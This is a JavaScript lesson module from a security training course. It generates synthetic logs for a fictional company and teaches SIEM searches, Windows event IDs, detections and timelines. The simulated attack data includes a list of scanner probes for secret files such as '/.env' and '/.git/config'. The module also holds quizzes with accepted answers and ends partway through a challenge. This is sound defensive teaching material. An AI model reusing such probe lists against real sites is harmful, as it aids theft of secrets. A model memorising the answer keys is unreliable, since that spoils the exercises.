import { random, at, sshEvent, webEvent, winEvent, proxyEvent, queried } from './helpers.js';
import { toBase64 } from '../assets/js/lib/bytes.js';

// Larkfield is the fictional company every investigation here belongs to.
// Its domain is larkfield.example and outside addresses come from the
// ranges set aside for documentation, so nothing points at a real system.

const STAFF = [['priya', '10.0.4.21'], ['tom', '10.0.4.22'], ['sam', '10.0.4.30'], ['deploy', '10.0.9.5']];
const BROWSER = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36';

// One day of data shared by all the lessons, so a pattern you find in one
// lesson is still there in the next.
function practiceEvents() {
  const r = random(313);
  const events = [];
  const port = () => r.int(49152, 65000);

  // Staff log in to Linux servers with keys during the working day.
  for (let i = 0; i < 70; i++) {
    const [user, ip] = r.pick(STAFF);
    events.push(sshEvent(at(7) + r.int(0, 11 * 3600) * 1000, { host: r.pick(['web01', 'web02', 'bastion']), action: 'success', user, ip, method: 'publickey', port: port(), pid: r.int(1000, 9000) }));
  }
  // A few mistyped passwords, each followed by a success.
  for (let i = 0; i < 6; i++) {
    const [user, ip] = r.pick(STAFF.slice(0, 3));
    const t = at(8) + r.int(0, 9 * 3600) * 1000;
    events.push(sshEvent(t, { host: 'bastion', action: 'failure', user, ip, port: port() }));
    events.push(sshEvent(t + r.int(8, 30) * 1000, { host: 'bastion', action: 'success', user, ip, port: port() }));
  }
  // Overnight password guessing against web01 from one address.
  let t = at(2, 10);
  for (let i = 0; i < 140; i++) {
    t += r.int(4, 12) * 1000;
    const user = r.pick(['root', 'root', 'root', 'admin', 'ubuntu', 'oracle', 'test']);
    events.push(sshEvent(t, { host: 'web01', action: 'failure', user, ip: '198.51.100.77', port: port(), invalid: user !== 'root' && user !== 'ubuntu', pid: 3100 + i }));
  }
  // A quieter address trying one password against many names.
  t = at(4, 40);
  for (const user of ['alice', 'bob', 'carol', 'dave', 'erin', 'frank', 'grace', 'heidi', 'ivan', 'judy', 'mallory', 'nina', 'oscar', 'peggy']) {
    t += r.int(50, 90) * 1000;
    events.push(sshEvent(t, { host: 'bastion', action: 'failure', user, ip: '203.0.113.61', port: port(), invalid: true, pid: 4100 + r.int(0, 99) }));
  }

  // The public website.
  const pages = ['/', '/products', '/products/kettle', '/products/toaster', '/about', '/contact', '/static/site.css', '/static/app.js', '/favicon.ico'];
  for (let i = 0; i < 420; i++) {
    const uri = r.pick(pages);
    events.push(webEvent(at(6) + r.int(0, 15 * 3600) * 1000, { ip: `192.0.2.${r.int(10, 90)}`, uri, status: uri === '/favicon.ico' && r.next() < 0.5 ? 404 : 200, bytes: r.int(300, 9000), ua: BROWSER }));
  }
  t = at(11, 5);
  for (const uri of ['/admin', '/.env', '/wp-login.php', '/phpmyadmin/', '/.git/config', '/backup.zip', '/server-status', '/config.php.bak', '/old/', '/test.php']) {
    t += r.int(1, 3) * 1000;
    events.push(webEvent(t, { ip: '203.0.113.200', uri, status: uri === '/.git/config' ? 403 : 404, bytes: 150, ua: 'python-requests/2.31' }));
  }

  // Windows: logons, a locked account, new processes and one new account.
  for (let i = 0; i < 90; i++) {
    const user = r.pick(['j.smith', 'a.khan', 'l.chen', 'm.garcia', 'r.oconnor']);
    const host = r.pick(['WS-011', 'WS-014', 'WS-022', 'WS-031']);
    events.push(winEvent(at(8) + r.int(0, 9 * 3600) * 1000, 4624, { host, user, logon_type: r.pick([2, 2, 3, 3, 3, 7]), src_ip: r.next() < 0.5 ? '127.0.0.1' : `10.0.5.${r.int(10, 60)}` }));
  }
  for (let i = 0; i < 7; i++) events.push(winEvent(at(9, 12, i * 9), 4625, { host: 'WS-014', user: 'm.garcia', logon_type: 2, src_ip: '127.0.0.1', failure_reason: 'bad password' }));
  events.push(winEvent(at(9, 13, 5), 4740, { host: 'DC01', user: 'm.garcia', caller_host: 'WS-014' }));
  for (const [time, user, src] of [[at(10, 2), 'tom.admin', '10.0.4.22'], [at(14, 31), 'tom.admin', '10.0.4.22'], [at(16, 5), 'a.khan', '10.0.5.33']]) {
    events.push(winEvent(time, 4624, { host: 'SRV-FILE01', user, logon_type: 10, src_ip: src }));
    if (user.endsWith('.admin')) events.push(winEvent(time + 1000, 4672, { host: 'SRV-FILE01', user, privileges: 'SeDebugPrivilege SeBackupPrivilege' }));
  }
  const processes = [['explorer.exe', 'chrome.exe'], ['explorer.exe', 'outlook.exe'], ['explorer.exe', 'excel.exe'], ['services.exe', 'svchost.exe'], ['explorer.exe', 'cmd.exe'], ['cmd.exe', 'ipconfig.exe']];
  for (let i = 0; i < 40; i++) {
    const [parent, process] = r.pick(processes);
    events.push(winEvent(at(8) + r.int(0, 9 * 3600) * 1000, 4688, { host: r.pick(['WS-011', 'WS-014', 'WS-022']), user: r.pick(['j.smith', 'a.khan', 'l.chen']), process, parent_process: parent }));
  }
  events.push(winEvent(at(10, 40), 4720, { host: 'DC01', user: 'n.starter', subject_user: 'helpdesk.anna' }));
  events.push(winEvent(at(10, 41), 4728, { host: 'DC01', user: 'n.starter', group: 'Domain Users', subject_user: 'helpdesk.anna' }));
  return events;
}

function lessonSiem(start, examples = []) {
  return { type: 'siem', events: practiceEvents(), start, examples };
}

export default {
  id: 'logs',
  title: 'Log investigation',
  short: 'Logs',
  summary: 'Search authentication, web and Windows logs in a SIEM, recognise common attack patterns, and turn what you find into detections and timelines.',
  intro: 'Almost every investigation starts in the logs. This topic uses a SIEM, the search tool security teams use to look through logs from many systems at once, and works up from your first search to building detections and reconstructing what an attacker did, minute by minute.',
  outcomes: [
    'Read Linux, web and Windows log entries and say what happened',
    'Search, filter and count events in a SIEM',
    'Tell brute force, password spraying and normal mistakes apart',
    'Know the Windows event IDs that matter most to defenders',
    'Turn a search into a detection with a threshold and a time window',
    'Build a timeline of an incident from several log sources'
  ],
  lessons: [
    {
      id: 'logs-intro',
      title: 'What logs tell you',
      summary: 'The parts of a log line, why times are kept in UTC, and what a SIEM adds.',
      minutes: 9,
      terms: [
        ['log', 'A record a system writes when something happens: a login, a web request, a program starting. Each record is usually one line with a time at the front.'],
        ['SIEM', 'Security information and event management. A system that collects logs from many sources, splits each line into named fields, and lets you search and count across all of them.'],
        ['field', 'A named piece of a log event, like `user`, `src_ip` or `status`. The SIEM pulls fields out of the raw line so you can search on them.'],
        ['index', 'A bucket of related logs in a SIEM, such as `linux`, `web` or `windows`. Searching one index is faster and less noisy than searching everything.'],
        ['UTC', 'Coordinated Universal Time. Logs from different countries and servers only line up if they all use one time zone, and UTC is the usual choice.']
      ],
      workspace: lessonSiem('index=linux', ['index=linux', 'index=web', 'index=windows', 'index=* | stats count by index']),
      blocks: [
        { type: 'text', body: 'A **log** is a diary that a system keeps about itself. A web server writes one line for every page it serves. A Linux server writes a line every time someone logs in or fails to. Windows writes an event when a program starts or an account is created. When something goes wrong, these records are usually the only witness.' },
        { type: 'code', body: 'Mar 13 02:14:07 web01 sshd[3112]: Failed password for root from 198.51.100.77 port 51022 ssh2', caption: 'One line from a Linux authentication log.' },
        { type: 'table', head: ['Part', 'Value', 'Meaning'], rows: [['Time', '`Mar 13 02:14:07`', 'When it happened. Note there is no year and no time zone in this format.'], ['Host', '`web01`', 'Which server wrote the line'], ['Process', '`sshd[3112]`', 'The SSH service, with its process number'], ['Message', '`Failed password for root ...`', 'What happened: someone tried to log in as root with a wrong password from 198.51.100.77']] },
        { type: 'text', body: 'Reading one line is easy. The hard part is that a company produces millions of them a day, on hundreds of machines, in dozens of formats. A **SIEM** solves that. It collects logs from everywhere, splits each line into named **fields** such as `user` and `src_ip`, and lets you search all of it at once.' },
        { type: 'text', body: 'The workspace on the right is a small SIEM with one day of logs from Larkfield, a made up company. Logs are grouped into **indexes**: `linux` for SSH logins, `web` for the public website, and `windows` for Windows security events. The search box already says `index=linux`. Press Search and you will see every Linux event, newest first, with a chart of when they happened.' },
        { type: 'task', text: 'Run `index=linux`, then click any event to open it and see its fields.', hint: 'Press the Search button. Each event line can be clicked to show its fields.', check: (log) => queried(log, (q) => q.includes('index=linux')) },
        { type: 'note', title: 'Raw and parsed', body: 'Each event keeps its original text, called the raw event, as well as the fields pulled out of it. When a field looks wrong, check the raw text. Parsers make mistakes, and the raw line is the evidence.' },
        { type: 'text', body: 'Look at the chart above the events. There is a dense block in the early hours of the morning, when nobody at Larkfield is working. A burst like that is the first thing a chart is good for: it shows you where to look.' },
        { type: 'predict', question: 'The busy block at around 02:00 to 02:30 is almost all `Failed password` lines from one address. What is the most likely explanation?', options: [
          { text: 'An automated program guessing passwords', correct: true, why: 'Hundreds of failures from one address, a few seconds apart, at night, is what password guessing tools look like. A person mistyping a password fails two or three times and then gets it right.' },
          { text: 'An employee who forgot their password', why: 'People give up or call the helpdesk after a few tries. They do not fail 140 times at 2 in the morning.' },
          { text: 'The server clock is wrong', why: 'A wrong clock moves events in time but does not create extra failures.' }
        ] },
        { type: 'text', body: 'Times deserve care. Linux auth logs often have no year and no time zone. Windows might log in local time. A cloud service logs in UTC. If you mix them without converting, events appear in the wrong order and you can draw the wrong conclusion. This SIEM shows everything in **UTC**, and that is the habit to keep in your notes too.' },
        { type: 'quiz', question: 'Your company has offices in London and Kuala Lumpur. Why should an investigation record every time in UTC?', options: [
          { text: 'So events from both offices line up in the right order', correct: true, why: 'Kuala Lumpur is eight hours ahead of London. Without one shared time zone, a login in one office and a file copy in the other could look hours apart when they happened a minute apart.' },
          { text: 'Because UTC is more accurate', why: 'UTC is not more precise. It is just one agreed reference that does not change with location or daylight saving.' },
          { text: 'Because logs cannot store local times', why: 'Many logs do store local time, which is exactly the problem.' }
        ] },
        { type: 'task', text: 'Run `index=* | stats count by index` to see how many events each index holds.', hint: 'Click it in Query help under "Try", or type it into the search box.', check: (log) => queried(log, (q) => q.includes('stats') && q.includes('by index')) }
      ]
    },
    {
      id: 'logs-searching',
      title: 'Searching and counting',
      summary: 'Filter on fields, combine conditions, and count with stats, sort and top.',
      minutes: 13,
      terms: [
        ['search expression', 'The part of a query before the first pipe. It decides which events you keep, for example `index=linux action=failure`.'],
        ['pipe', 'The `|` symbol. Each command after a pipe works on the results of everything before it, just like in a Linux shell.'],
        ['stats', 'Groups events and calculates numbers for each group. `stats count by src_ip` gives one row per address with how many events it had.'],
        ['dc', 'Distinct count. `dc(user)` counts how many different users appear, not how many events.'],
        ['wildcard', 'A `*` inside a value matches any text. `user=adm*` matches admin, administrator and admin2.']
      ],
      workspace: lessonSiem('index=linux action=failure', ['index=linux action=failure | stats count by src_ip | sort -count', 'index=linux action=failure | top user', 'index=web status=404 | stats count by src_ip, uri', 'index=linux NOT src_ip=10.*']),
      blocks: [
        { type: 'text', body: 'A search has two parts. First comes the **search expression**, which picks the events you want. Then come commands, each after a **pipe**, that reshape those events. The shape is the same as a Linux pipeline: filter first, then count, then sort.' },
        { type: 'table', head: ['You write', 'It keeps events where'], rows: [['`action=failure`', 'the action field is failure'], ['`status!=200`', 'the status is anything except 200'], ['`bytes>5000`', 'bytes is more than 5000'], ['`user=adm*`', 'user starts with adm'], ['`root`', 'the raw text contains root anywhere'], ['`"invalid user"`', 'the raw text contains that exact phrase']] },
        { type: 'text', body: 'Several conditions next to each other must all be true, so `index=linux action=failure user=root` means all three. Use `OR` for either one, `NOT` to exclude, and brackets to group: `index=linux (user=root OR user=admin) NOT src_ip=10.*`. Values are not case sensitive, but field names are.' },
        { type: 'task', text: 'Search for failed Linux logins that did not come from the internal network, which here is everything starting with `10.`.', hint: 'Start from `index=linux action=failure` and add `NOT src_ip=10.*`.', check: (log) => queried(log, (q, e) => /not\s+src_ip\s*=\s*10\./.test(q) && e.count > 0) },
        { type: 'text', body: 'Reading events one by one stops working after a few dozen. **stats** groups events and counts them, which turns hundreds of lines into a short table you can actually reason about.' },
        { type: 'example', title: 'Counting', steps: [
          { cmd: 'index=linux action=failure | stats count by src_ip', note: 'One row per source address, with the number of failures each.' },
          { cmd: 'index=linux action=failure | stats count by src_ip | sort -count', note: 'The minus sign sorts largest first.' },
          { cmd: 'index=linux action=failure | stats count, dc(user) as users by src_ip', note: '`dc` counts distinct values. `as` renames the column.' },
          { cmd: 'index=linux action=failure | top user limit=5', note: '`top` is a shortcut for the most common values, with percentages.' }
        ] },
        { type: 'task', text: 'Count failed Linux logins per source address, biggest first. Which address is at the top?', hint: 'Use the second example, or click it under Query help.', check: (log) => queried(log, (q, e) => q.includes('stats') && q.includes('src_ip') && e.rows?.some((row) => row.src_ip === '198.51.100.77')) },
        { type: 'order', question: 'Put these pieces in order to find which web pages returned the most 404 errors.', items: ['`index=web status=404`', '`| stats count by uri`', '`| sort -count`', '`| head 5`'], explain: 'Filter to the events you care about, group and count, rank, then keep the top few. Most useful searches have this shape.' },
        { type: 'predict', question: 'What does `index=linux action=failure | stats dc(src_ip)` return?', options: [
          { text: 'One number: how many different addresses had at least one failure', correct: true, why: 'With no `by`, stats produces a single row. `dc` counts distinct values rather than events.' },
          { text: 'A list of every address with its failure count', why: 'That would be `stats count by src_ip`.' },
          { text: 'The total number of failures', why: 'That would be `stats count`.' }
        ] },
        { type: 'answer', question: 'Write the search that shows the five most common user names in failed Linux logins, using `top`.', accept: ['index=linux action=failure | top user limit=5', 'index=linux action=failure | top limit=5 user', 'index=linux action=failure |top user limit=5'], hint: 'Filter to failures in the linux index, then `| top user limit=5`.', explain: 'You will see root at the top. Attackers try root first because it exists on every Linux system.' },
        { type: 'note', title: 'Fields panel', body: 'Under the search, "Fields in these results" lists every field with its most common values. Click any value to add it to your search. It is often the fastest way to narrow down.' }
      ]
    },
    {
      id: 'logs-auth',
      title: 'Reading authentication logs',
      summary: 'What sshd records, and how brute force, password spraying and honest mistakes look different.',
      minutes: 13,
      terms: [
        ['brute force', 'Trying many passwords against one or a few accounts. It shows up as lots of failures for the same user from the same source.'],
        ['password spraying', 'Trying one or two common passwords against many different accounts. Each account sees only a few failures, which can slip under lockout rules.'],
        ['credential stuffing', 'Trying user name and password pairs leaked from other websites, betting that people reuse passwords.'],
        ['invalid user', 'sshd says "invalid user" when the account does not exist on that server. Many invalid users from one source suggests someone is guessing names.'],
        ['public key authentication', 'Logging in with a key file instead of a password. It cannot be guessed the way a password can, which is why servers often only allow keys.']
      ],
      workspace: lessonSiem('index=linux', ['index=linux | stats count by action, auth_method', 'index=linux action=failure | stats count, dc(user) as users by src_ip | sort -count', 'index=linux src_ip=203.0.113.61 | table _time, user, action', 'index=linux user_exists=false | stats count by src_ip']),
      blocks: [
        { type: 'text', body: 'The SSH service, sshd, records every attempt to log in. The lines follow a few fixed patterns, and you will see them on every Linux server you look after.' },
        { type: 'code', body: 'Accepted publickey for priya from 10.0.4.21 port 51022 ssh2\nAccepted password for tom from 10.0.4.22 port 50210 ssh2\nFailed password for root from 198.51.100.77 port 40112 ssh2\nFailed password for invalid user oracle from 198.51.100.77 port 40118 ssh2', caption: 'The four sshd messages you will meet most often.' },
        { type: 'text', body: '**Accepted** means the login worked, and the word after it says how: with a key or a password. **Failed** means it did not. **Invalid user** means the name does not exist on this server at all, which a real employee would rarely get wrong.' },
        { type: 'task', text: 'Find out how logins at Larkfield normally happen: count Linux events by `action` and `auth_method`.', hint: '`index=linux | stats count by action, auth_method`', check: (log) => queried(log, (q) => q.includes('stats') && q.includes('action') && q.includes('auth_method')) },
        { type: 'text', body: 'Successful logins here are almost all `publickey`. That is a useful baseline: if you ever see `Accepted password` from outside the company, it deserves a close look, because it means a password worked where keys are the norm.' },
        { type: 'text', body: 'Failed logins come in recognisable shapes. Counting both the events and the **distinct users** per source tells most of them apart.' },
        { type: 'table', head: ['Pattern', 'From one source', 'Users tried', 'Attempts per user'], rows: [['Brute force', 'Many attempts', 'One or a few', 'Many'], ['Password spraying', 'Many attempts, often slow', 'Many', 'One or two'], ['Credential stuffing', 'Often many sources', 'Many', 'One each, with different passwords'], ['Someone mistyping', 'Two or three attempts', 'One', 'Few, then a success']] },
        { type: 'task', text: 'For each source of failures, count the events and the distinct users. Which address looks like spraying rather than brute force?', hint: '`index=linux action=failure | stats count, dc(user) as users by src_ip | sort -count`', check: (log) => queried(log, (q, e) => q.includes('dc(user)') && e.rows?.some((row) => row.src_ip === '203.0.113.61')) },
        { type: 'quiz', question: '`203.0.113.61` made 14 attempts, each against a different user, about a minute apart. Why might an attacker work this way?', options: [
          { text: 'To stay below account lockout limits while still trying many accounts', correct: true, why: 'Lockout usually triggers after a handful of failures on one account. One attempt per account never reaches it, and the slow pace keeps rate based alerts quiet too.' },
          { text: 'Because the server only allows one attempt per minute', why: 'sshd does not work like that, and the other address managed several attempts a minute.' },
          { text: 'It is probably a monitoring system checking accounts', why: 'Monitoring checks known accounts. These names do not exist on the server, which sshd records as invalid user.' }
        ] },
        { type: 'spot', question: 'These are the events for one user over a minute. Which line is the one that should worry you?', code: 'Failed password for tom from 10.0.4.22 port 50201 ssh2\nAccepted password for tom from 10.0.4.22 port 50210 ssh2\nFailed password for root from 198.51.100.77 port 40112 ssh2\nAccepted password for root from 198.51.100.77 port 40190 ssh2', line: 4, explain: 'A success from the same outside address that was just failing means a guess worked. Failures alone are background noise on any internet facing server. A success after failures is the moment an attempt became a breach.', nudge: 'Failures are common. Look for the one line that means an attempt worked.' },
        { type: 'note', title: 'What to do about it', body: 'Disable password logins for SSH and use keys, never allow root to log in directly, and put SSH behind a VPN or allow list where you can. Tools like fail2ban block addresses after repeated failures, which reduces the noise but does not stop a slow spray.' }
      ]
    },
    {
      id: 'logs-windows',
      title: 'Windows event IDs',
      summary: 'The handful of Windows Security event IDs that answer most investigation questions, and what logon types mean.',
      minutes: 15,
      terms: [
        ['event ID', 'A number Windows gives each kind of event. 4624 always means a successful logon, so defenders search by ID rather than by message text.'],
        ['logon type', 'A number in logon events saying how someone logged on: 2 at the keyboard, 3 over the network, 10 over Remote Desktop, and so on.'],
        ['4688', 'Process creation. Records each program that starts, which user started it and which program was its parent.'],
        ['parent process', 'The program that started another program. Word starting PowerShell is suspicious in a way that Explorer starting Word is not.'],
        ['domain controller', 'The Windows server that checks passwords and holds accounts for the whole network. Its logs see every domain logon.']
      ],
      workspace: lessonSiem('index=windows', ['index=windows | stats count by EventCode, message | sort -count', 'index=windows EventCode=4625 | stats count by user, host', 'index=windows EventCode=4624 logon_type=10 | table _time, host, user, src_ip', 'index=windows EventCode=4688 | stats count by parent_process, process']),
      blocks: [
        { type: 'text', body: 'Windows records security events with a numeric **event ID**. You do not need to learn hundreds of them. A short list answers most of the questions an investigation asks: who logged on, from where, what ran, and what changed.' },
        { type: 'table', head: ['ID', 'What it records', 'Why defenders care'], rows: [['4624', 'Successful logon', 'Who got in, where from, and how (logon type)'], ['4625', 'Failed logon', 'Password guessing and mistakes'], ['4634', 'Logoff', 'With 4624, how long a session lasted'], ['4672', 'Special privileges assigned', 'An administrator level account logged on'], ['4688', 'New process created', 'What ran, who ran it, and its parent'], ['4720', 'User account created', 'New accounts are a common way to keep access'], ['4728 / 4732', 'Added to a global / local group', 'Especially Administrators or Domain Admins'], ['4740', 'Account locked out', 'Repeated failures, or a guessing attack'], ['7045', 'Service installed', 'Malware and remote admin tools often install as services'], ['1102', 'Security log cleared', 'Rarely legitimate. Often someone covering tracks']] },
        { type: 'task', text: 'Get an overview: count Windows events by `EventCode` and `message`.', hint: '`index=windows | stats count by EventCode, message | sort -count`', check: (log) => queried(log, (q) => q.includes('index=windows') && q.includes('stats') && q.includes('eventcode')) },
        { type: 'text', body: 'A 4624 logon event on its own says little until you read the **logon type**. The same user name means something very different at the keyboard than over Remote Desktop from an unknown address.' },
        { type: 'table', head: ['Logon type', 'Meaning'], rows: [['2', 'Interactive: at the keyboard'], ['3', 'Network: a file share, printer or similar'], ['4', 'Batch: a scheduled task'], ['5', 'Service: a Windows service starting'], ['7', 'Unlock: someone unlocked their screen'], ['10', 'Remote interactive: Remote Desktop (RDP)'], ['11', 'Cached: logged on with saved credentials, often a laptop away from the office']] },
        { type: 'task', text: 'List every Remote Desktop logon with its time, host, user and source address.', hint: 'Remote Desktop is logon type 10. `index=windows EventCode=4624 logon_type=10 | table _time, host, user, src_ip`', check: (log) => queried(log, (q, e) => q.includes('4624') && q.includes('logon_type=10') && e.count > 0) },
        { type: 'predict', question: 'Seven 4625 events for `m.garcia` on WS-014, logon type 2, a few seconds apart, then a 4740. What happened?', options: [
          { text: 'Someone at the keyboard kept typing the wrong password and locked the account', correct: true, why: 'Logon type 2 means at the keyboard. Repeated failures followed by 4740 is a lockout. Most lockouts are people who changed their password and forgot, but it is still worth confirming with the person.' },
          { text: 'An attacker on the internet is guessing the password', why: 'An attack from outside would show logon type 3 or 10 and a remote source address, not type 2 from the machine itself.' },
          { text: 'The account was deleted', why: 'Deleting an account is event 4726. 4740 is a lockout.' }
        ] },
        { type: 'text', body: 'Process creation, event **4688**, is one of the most valuable events once it is switched on. It names the new program and its **parent process**. Normal parents are predictable: Explorer starts the programs you click, services.exe starts services. Unusual parents stand out.' },
        { type: 'quiz', question: 'Which parent and child pair would you investigate first?', options: [
          { text: '`winword.exe` starting `powershell.exe`', correct: true, why: 'Word has no normal reason to start PowerShell. This pair is a classic sign of a malicious document running code, and many detection rules look for exactly this.' },
          { text: '`explorer.exe` starting `chrome.exe`', why: 'That is someone double clicking the browser.' },
          { text: '`services.exe` starting `svchost.exe`', why: 'That is how Windows starts its own services every day.' }
        ] },
        { type: 'answer', question: 'Which event ID would you search for to find out whether anyone was added to a local Administrators group?', accept: ['4732'], hint: 'It is one of the two "member added to a group" IDs. Local groups, not global.', explain: '4732 covers local groups such as Administrators on a single machine. 4728 is the equivalent for global groups in the domain, such as Domain Admins.' },
        { type: 'note', title: 'Turn it on first', body: 'Several of these events, including 4688 and the command line inside it, are not recorded by default. Logging policy is part of preparation: you cannot investigate what was never written down. Microsoft publishes recommended audit policy settings, and Sysmon adds even more detail.' }
      ]
    },
    {
      id: 'logs-detections',
      title: 'Turning a search into a detection',
      summary: 'Thresholds, time windows, false positives, and how to write a detection someone else can act on.',
      minutes: 14,
      terms: [
        ['detection', 'A saved search that runs on a schedule and raises an alert when it finds something. Good detections also say why they exist and what to do when they fire.'],
        ['threshold', 'The number of matching events needed before an alert fires, such as more than 20 failures.'],
        ['time window', 'How far back each run of a detection looks, such as the last 5 minutes. Thresholds only make sense with a window.'],
        ['false positive', 'An alert that fires on harmless activity. Too many and people start ignoring alerts.'],
        ['false negative', 'Real malicious activity that a detection missed.'],
        ['MITRE ATT&CK', 'A public catalogue of attacker techniques with IDs, such as T1110 for brute force. Detections are often labelled with the technique they cover.']
      ],
      workspace: lessonSiem('index=linux action=failure | bin span=5m | stats count by _time, src_ip | where count > 20', ['index=linux action=failure | bin span=5m | stats count by _time, src_ip | where count > 20', 'index=linux action=failure | timechart span=10m count', 'index=linux action=failure | stats dc(user) as users by src_ip | where users > 10', 'index=linux action=success auth_method=password NOT src_ip=10.*']),
      blocks: [
        { type: 'text', body: 'Finding something once is an investigation. Finding it every time it happens, automatically, is a **detection**. A detection is a search that runs on a schedule, for example every five minutes, and raises an alert when its results cross a line you choose.' },
        { type: 'text', body: 'Most detections need two numbers. The **time window** is how far back each run looks. The **threshold** is how much activity counts as suspicious. "More than 20 failed logins from one address in 5 minutes" is a threshold of 20 in a window of 5 minutes.' },
        { type: 'example', title: 'Building a brute force detection', steps: [
          { cmd: 'index=linux action=failure | bin span=5m | stats count by _time, src_ip', note: '`bin span=5m` rounds every time down to a 5 minute slot, so stats counts per address per slot.' },
          { cmd: 'index=linux action=failure | bin span=5m | stats count by _time, src_ip | where count > 20', note: '`where` keeps only the rows over the threshold. Each remaining row would be one alert.' },
          { cmd: 'index=linux action=failure | timechart span=10m count', note: '`timechart` shows the same counts over time, which helps you choose a sensible threshold.' }
        ] },
        { type: 'task', text: 'Run the brute force detection with a 5 minute window and a threshold of 20. Which address does it catch?', hint: 'It is the first example. Click Run it.', check: (log) => queried(log, (q, e) => q.includes('bin') && q.includes('where') && e.rows?.some((row) => row.src_ip === '198.51.100.77')) },
        { type: 'text', body: 'Now notice what it missed. The slow spray from `203.0.113.61` never gets anywhere near 20 failures in 5 minutes. A detection built for one pattern is blind to another, which is why teams keep several detections for the same goal, each looking at the problem from a different side.' },
        { type: 'task', text: 'Write a second detection that catches spraying instead: sources that tried more than 10 different user names.', hint: 'Count distinct users per source with `dc(user) as users`, then `where users > 10`.', check: (log) => queried(log, (q, e) => q.includes('dc(user)') && q.includes('where') && e.rows?.some((row) => row.src_ip === '203.0.113.61')) },
        { type: 'text', body: 'Every threshold is a trade. Set it low and you catch more, but alert on staff who mistype their passwords: **false positives**. Set it high and the alerts are clean, but a careful attacker stays underneath: **false negatives**. Tuning means looking at real data, finding where normal activity ends, and deciding which mistakes you can live with.' },
        { type: 'quiz', question: 'Your spraying detection fires every morning on the address of the company VPN, because many staff connect through it and a few mistype passwords. What is the best fix?', options: [
          { text: 'Exclude the VPN address but add a separate check on the user accounts behind it', correct: true, why: 'Excluding a known noisy source is normal tuning, but if you only exclude it you also blind yourself to an attacker who comes in through the VPN. Moving the check to the right field keeps the coverage.' },
          { text: 'Raise the threshold to 500 for everyone', why: 'That silences the noise and every real spray along with it.' },
          { text: 'Delete the detection, since it is noisy', why: 'Then you have no coverage at all. Noisy detections should be tuned, not removed.' }
        ] },
        { type: 'order', question: 'A good detection is written down so the person who gets the alert at 3am knows what to do. Put the parts in a sensible order.', items: ['What it looks for, in one sentence', 'Why it matters (with the ATT&CK technique, like T1110.003 for password spraying)', 'The search, window and threshold', 'Known false positives and how to rule them out', 'What to do when it fires'], explain: 'The response steps are the part most often missing. An alert with no instructions tends to get closed without anyone looking.' },
        { type: 'note', title: 'Sigma', body: 'Sigma is an open format for writing detections once and converting them to many SIEMs. The public Sigma rule repository has thousands of community detections and is a good place to see how experienced teams describe logic, false positives and severity.' }
      ]
    },
    {
      id: 'logs-timeline',
      title: 'Triage and timelines',
      summary: 'The first questions to ask about an alert, how to pivot between sources, and how to lay events out in order.',
      minutes: 14,
      terms: [
        ['triage', 'Deciding quickly how serious an alert is and what to do next. Is it real, what does it affect, and how urgent is it?'],
        ['pivot', 'Using one value you found, like an address or a user name, to search a different log source and find related activity.'],
        ['timeline', 'A list of events from every relevant source, sorted by time. It turns scattered log lines into a story of what happened.'],
        ['indicator', 'A piece of evidence that identifies malicious activity, such as an address, domain, file hash or user name. Often called an IOC, indicator of compromise.'],
        ['scope', 'How far an incident reaches: which accounts, machines and data were involved. Getting the scope right decides what has to be cleaned up.']
      ],
      workspace: lessonSiem('src_ip=198.51.100.77', ['src_ip=198.51.100.77 | stats count by index, action', 'src_ip=198.51.100.77 | stats earliest(_time) as first, latest(_time) as last, count', 'index=linux src_ip=198.51.100.77 | sort _time | table _time, host, user, action', 'index=* (src_ip=198.51.100.77 OR src_ip=203.0.113.61 OR src_ip=203.0.113.200) | stats count by src_ip, index']),
      blocks: [
        { type: 'text', body: 'An alert arrives: lots of failed SSH logins on web01 overnight. Before anything else, **triage** it. Four questions decide almost everything that follows.' },
        { type: 'table', head: ['Question', 'How you answer it here'], rows: [['Is it real?', 'Look at the raw events. Are these genuine failures from an outside address?'], ['Did it work?', 'Search for any success from the same source or for the same users afterwards'], ['What else did this source touch?', 'Pivot: search every index for the address'], ['How far does it reach?', 'Scope: which hosts and accounts were involved, and when did it start and stop?']] },
        { type: 'text', body: 'To **pivot**, take a value from what you found and search for it everywhere else. An address that failed SSH logins might also appear in web logs or in Windows events. Searching without an index looks across every source at once.' },
        { type: 'task', text: 'Pivot on `198.51.100.77`: count its events by index and action, then check whether any of its attempts succeeded.', hint: '`src_ip=198.51.100.77 | stats count by index, action`', check: (log) => queried(log, (q) => q.includes('198.51.100.77') && q.includes('stats') && q.includes('action')) },
        { type: 'text', body: 'No success, and no activity anywhere else. That changes the response. A guessing attack that never got in is worth blocking and noting, but it is not a breach. Triage is as much about ruling things out as finding them.' },
        { type: 'text', body: 'For a **timeline**, sort the events oldest first and keep only the columns that matter. `earliest` and `latest` give you the first and last time something was seen, which bound the incident.' },
        { type: 'example', title: 'Building a timeline', steps: [
          { cmd: 'src_ip=198.51.100.77 | stats earliest(_time) as first, latest(_time) as last, count', note: 'When it started, when it stopped, and how many events.' },
          { cmd: 'index=linux src_ip=198.51.100.77 | sort _time | table _time, host, user, action', note: '`sort _time` without a minus is oldest first. `table` picks the columns.' }
        ] },
        { type: 'task', text: 'Find the first and last time `198.51.100.77` was seen.', hint: 'Use `stats earliest(_time) as first, latest(_time) as last` on its events.', check: (log) => queried(log, (q) => q.includes('earliest') && q.includes('198.51.100.77')) },
        { type: 'answer', question: 'In UTC, at what minute did the guessing from 198.51.100.77 start? Answer as HH:MM.', accept: ['02:10'], hint: 'Read the `first` column from the earliest search.', explain: 'The first failure arrived a few seconds after 02:10 UTC. Writing the window down (02:10 to about 02:31) means anyone who picks up the case can repeat your searches over exactly the same period.' },
        { type: 'order', question: 'Put these steps of handling an alert in order.', items: ['Read the alert and the raw events behind it', 'Decide whether it is real and whether it worked', 'Pivot on its indicators to find related activity', 'Build a timeline and set the scope', 'Contain, then write up what you found and did'], explain: 'Containment can start earlier if the evidence shows something is actively happening. Whatever the order, keep notes as you go: every search, every time, every decision.' },
        { type: 'note', title: 'Write it down as you go', body: 'Keep a running case log: the time, what you searched for, what you found, and what you decided. It feels slow, but it is how others can check your work, how you hand over at the end of a shift, and how the final report gets written.' }
      ]
    }
  ],
  challenges: [
    {
      id: 'logs-overnight',
      title: 'Night shift',
      difficulty: 'easy',
      points: 100,
      skills: ['stats', 'sort', 'top'],
      prepare: ['logs-searching', 'logs-auth'],
      brief: 'Several addresses spent the night trying to log in to `web02` over SSH. The on call engineer wants to block the worst offender first and check whether the account it went after most is even a real account on the server.',
